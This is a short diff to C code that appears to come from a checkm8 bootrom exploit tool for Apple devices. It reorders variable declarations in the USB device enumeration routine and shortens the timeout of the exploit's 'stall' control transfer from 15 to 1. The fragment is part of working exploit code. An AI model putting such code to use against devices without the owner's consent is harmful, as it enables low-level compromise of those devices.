@@ -10,6 +10,10 @@
 int get_device_bundle(struct pwned_device *dev)
 {
     checkm8_debug_indent("get_device_bundle(dev = %p)\n", dev);
+
+    int i, usb_dev_count, ret = LIBUSB_ERROR_NO_DEVICE;
+    libusb_device **usb_device_list = NULL;
+
     if(dev->bundle->ctx == NULL)
     {
         checkm8_debug_indent("\tbundle ctx is NULL, allocating\n");
@@ -27,9 +31,6 @@ int get_device_bundle(struct pwned_device *dev)
         }
     }
 
-    libusb_device **usb_device_list = NULL;
-    int usb_dev_count, ret = LIBUSB_ERROR_NO_DEVICE;
-
     usb_dev_count = libusb_get_device_list(dev->bundle->ctx, &usb_device_list);
     checkm8_debug_indent("\tfound %i USB devices\n", usb_dev_count);
 
@@ -37,7 +38,7 @@ int get_device_bundle(struct pwned_device *dev)
     dev->bundle->handle = NULL;
     dev->bundle->descriptor = malloc(sizeof(struct libusb_device_descriptor));
 
-    for(unsigned int i = 0; i < usb_dev_count; i++)
+    for(i = 0; i < usb_dev_count; i++)
     {
         dev->bundle->device = usb_device_list[i];
         libusb_get_device_descriptor(dev->bundle->device, dev->bundle->descriptor);
@@ -263,7 +264,7 @@ static unsigned char data_0x0_0xC0_buf[192] =
 
 int stall(struct pwned_device *dev)
 {
-    return libusb1_async_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A, data_0xA_0xC0_buf, 0xC0, 15);
+    return libusb1_async_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A, data_0xA_0xC0_buf, 0xC0, 1);
 }
 
 int leak(struct pwned_device *dev)
